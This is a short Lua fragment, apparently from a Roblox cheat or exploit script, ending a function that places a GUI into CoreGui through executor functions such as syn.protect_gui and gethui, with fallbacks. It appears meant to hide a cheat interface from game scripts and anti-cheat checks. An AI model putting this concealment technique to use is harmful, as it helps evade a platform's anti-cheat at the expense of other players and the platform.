	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(_g)
			_g.Parent = _gs("CoreGui")
			_parented = true
		end
	end)
	if not _parented then
		pcall(function()
			if gethui then
				_g.Parent = gethui()
				_parented = true
			end
		end)
	end
	if not _parented then
		pcall(function()
			_g.Parent = _gs("CoreGui")
			_parented = true
		end)
	end
	if not _parented then
		_g.Parent = LocalPlayer:FindFirstChildOfClass("PlayerGui")
	end
	return _g
end

